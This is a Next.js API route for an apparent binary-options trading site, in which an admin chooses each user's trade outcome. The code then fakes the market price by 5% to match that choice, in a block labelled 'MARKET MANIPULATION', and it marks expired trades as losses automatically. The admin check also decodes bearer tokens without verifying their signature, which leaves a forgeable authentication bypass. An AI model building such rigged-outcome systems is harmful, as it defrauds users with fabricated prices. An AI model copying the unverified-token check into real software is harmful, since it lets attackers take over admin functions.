
import { NextRequest, NextResponse } from "next/server";
import { createServerClient, tryCreateAdminClient } from "@/lib/supabase";
import { isAdmin } from "@/lib/admin";

export const dynamic = 'force-dynamic';


export async function POST(request: NextRequest) {
    try {
        const supabase = createServerClient();

        // Auth & Admin Check
        const authHeader = request.headers.get("authorization");
        if (!authHeader) return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
        const token = authHeader.replace("Bearer ", "").trim();

        // Validate Token and Admin Role
        let userId: string | null = null;
        try {
            const parts = token.split('.');
            const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
            userId = payload.sub;
        } catch (e) {
            return NextResponse.json({ error: "Invalid token" }, { status: 401 });
        }

        if (!userId || !(await isAdmin(userId))) {
            return NextResponse.json({ error: "Forbidden" }, { status: 403 });
        }

        const body = await request.json();
        const { sessionId, action } = body;

        if (!sessionId || !['WIN', 'LOSS'].includes(action)) {
            return NextResponse.json({ error: "Invalid request" }, { status: 400 });
        }

        const adminClient = tryCreateAdminClient();
        if (!adminClient) {
            return NextResponse.json({ error: "Admin client unavailable" }, { status: 500 });
        }

        // Get Session
        const { data: session, error: sessionError } = await adminClient
            .from("trade_sessions")
            .select("*")
            .eq("id", sessionId)
            .single();

        if (sessionError || !session) {
            return NextResponse.json({ error: "Session not found" }, { status: 404 });
        }

        if (session.status !== 'PENDING') {
            return NextResponse.json({ error: "Session already finalized" }, { status: 400 });
        }

        // --- MARKET MANIPULATION START ---
        // 1. Get current market price
        const symbol = session.symbol.split('/')[0]; // BTC/USD -> BTC
        let currentPrice = 0;
        const { data: marketData } = await adminClient.from('market_state').select('price').eq('symbol', symbol).single();

        if (marketData) {
            currentPrice = Number(marketData.price);
        } else {
            // Fetch from session amount relative? Or just use a default?
            // Ideally we should have the price stored in session, but let's just use 100 if missing.
            currentPrice = 100;
        }

        let newPrice = currentPrice;
        let trend = 'RANDOM';

        // 2. Logic: Win = Pump, Loss = Dump (relative to current)
        // Note: For binary options, "Win" means price > entry. 
        // But here we simplify: Win action makes the graph go UP.
        if (action === 'WIN') {
            newPrice = currentPrice * 1.05; // +5%
            trend = 'UP';
        } else {
            newPrice = currentPrice * 0.95; // -5%
            trend = 'DOWN';
        }

        // 3. Update Market State (Triggers Realtime)
        await adminClient.from('market_state').upsert({
            symbol,
            price: newPrice,
            trend,
            last_updated: new Date().toISOString()
        });
        // --- MARKET MANIPULATION END ---

        // Update Session Outcome
        const status = action === 'WIN' ? 'WON' : 'LOST';

        const { error: updateError } = await adminClient
            .from("trade_sessions")
            .update({
                status: status,
                outcome_override: action,
                end_time: new Date().toISOString()
            })
            .eq("id", sessionId);

        if (updateError) {
            return NextResponse.json({ error: "Failed to update session" }, { status: 500 });
        }

        // Handle Payout if WIN - Use dynamic profit percentage from session
        const profitPercentage = session.profit_percentage || 80; // Default to 80% if not set

        if (action === 'WIN') {
            const profitAmount = Number(session.amount) * (profitPercentage / 100);
            const payout = Number(session.amount) + profitAmount;
            const { data: userData } = await adminClient
                .from("users")
                .select("account_balance")
                .eq("id", session.user_id)
                .single();

            if (userData) {
                const newBalance = Number(userData.account_balance) + payout;
                await adminClient
                    .from("users")
                    .update({ account_balance: newBalance })
                    .eq("id", session.user_id);

                // Create transaction record for WIN
                await adminClient
                    .from("transactions")
                    .insert({
                        user_id: session.user_id,
                        symbol: session.symbol,
                        type: 'sell', // Using 'sell' to indicate trade completion/win
                        quantity: 1,
                        price: payout,
                        total_amount: payout,
                    });

                // Send WIN notification to user
                const { error: notifError } = await adminClient
                    .from("notifications")
                    .insert({
                        user_id: session.user_id,
                        title: "🎉 Trade Won!",
                        message: `Your ${session.symbol} trade won! You earned $${profitAmount.toFixed(2)} profit (${profitPercentage}%). Total payout: $${payout.toFixed(2)}`,
                        type: "success",
                        is_read: false
                    });

                if (notifError) {
                    console.error("❌ Failed to insert WIN notification:", notifError);
                } else {
                    console.log("✅ WIN notification sent to user:", session.user_id);
                }
            }
        } else {
            // For LOSS, create transaction record showing the loss
            await adminClient
                .from("transactions")
                .insert({
                    user_id: session.user_id,
                    symbol: session.symbol,
                    type: 'sell', // Using 'sell' to indicate trade completion/loss
                    quantity: 1,
                    price: 0, // Loss means 0 return
                    total_amount: 0,
                });

            // Send LOSS notification to user
            const { error: notifError } = await adminClient
                .from("notifications")
                .insert({
                    user_id: session.user_id,
                    title: "📉 Trade Lost",
                    message: `Your ${session.symbol} trade ended in a loss. You lost $${Number(session.amount).toFixed(2)}.`,
                    type: "error",
                    is_read: false
                });

            if (notifError) {
                console.error("❌ Failed to insert LOSS notification:", notifError);
            } else {
                console.log("✅ LOSS notification sent to user:", session.user_id);
            }
        }

        return NextResponse.json({ success: true, status, newPrice });

    } catch (error) {
        console.error("Error updating trade session:", error);
        return NextResponse.json({ error: "Internal server error" }, { status: 500 });
    }
}


export async function GET(request: NextRequest) {
    // Fetch ALL pending sessions for Admin
    try {
        const authHeader = request.headers.get("authorization");
        if (!authHeader) return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
        const token = authHeader.replace("Bearer ", "").trim();

        // Decode JWT token to get user ID
        let userId: string | null = null;
        try {
            const parts = token.split('.');
            const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
            userId = payload.sub;
        } catch (e) {
            return NextResponse.json({ error: "Invalid token" }, { status: 401 });
        }

        if (!userId || !(await isAdmin(userId))) {
            return NextResponse.json({ error: "Forbidden" }, { status: 403 });
        }

        const adminClient = tryCreateAdminClient();
        if (!adminClient) return NextResponse.json({ error: "Server Error" }, { status: 500 });

        const { data: pendingSessions, error: fetchError } = await adminClient
            .from("trade_sessions")
            .select("*, users(email)") // Join with users to see who is trading
            .eq("status", "PENDING")
            .order("created_at", { ascending: false });

        if (fetchError) throw fetchError;

        // Check for expired pending sessions and update them to LOST
        if (pendingSessions && pendingSessions.length > 0) {
            const now = Date.now();
            const updates = pendingSessions.map(async (session) => {
                // Timezone Fix: Force UTC parsing
                let createdStr = session.created_at;
                if (!createdStr.endsWith('Z') && !createdStr.match(/[+-]\d{2}:\d{2}$/)) {
                    createdStr += 'Z';
                }
                const startTime = new Date(createdStr).getTime();
                const durationMs = session.duration * 1000;

                // Only expire if definitely past duration + buffer
                if (now > startTime + durationMs + 2000) {
                    console.log(`[Admin] Session ${session.id} expired. Auto-resolving to LOST.`);

                    // Update to LOST
                    await adminClient
                        .from("trade_sessions")
                        .update({
                            status: 'LOST',
                            end_time: new Date().toISOString(),
                            outcome_override: 'AUTO_LOSS'
                        })
                        .eq("id", session.id);

                    // Create transaction for the loss record
                    await adminClient
                        .from("transactions")
                        .insert({
                            user_id: session.user_id,
                            symbol: session.symbol,
                            type: 'sell',
                            quantity: 1,
                            price: 0,
                            total_amount: 0,
                        });

                    // Send LOSS notification
                    try {
                        await adminClient
                            .from("notifications")
                            .insert({
                                user_id: session.user_id,
                                title: "📉 Trade Lost (Expired)",
                                message: `Your ${session.symbol} trade expired and ended in a loss.`,
                                type: "error",
                                is_read: false
                            });
                    } catch (e) {
                        console.error("Failed to send auto-loss notification", e);
                    }

                    // Mark as updated in local list (so UI doesn't show it as pending)
                    session.status = 'LOST';
                }
            });

            await Promise.all(updates);
        }

        // Return the sessions (some might have been updated to LOST, so we filter them out or return them as is? 
        // Admin usually wants to see Pending, but if it just turned Lost, maybe we shouldn't show it in "Pending" list anymore.
        // Let's filter out the ones that are now LOST.
        const activePendingSessions = pendingSessions.filter(s => s.status === 'PENDING');

        return NextResponse.json(activePendingSessions);

    } catch (error) {
        console.error("Error fetching admin sessions:", error);
        return NextResponse.json({ error: "Internal server error" }, { status: 500 });
    }
}
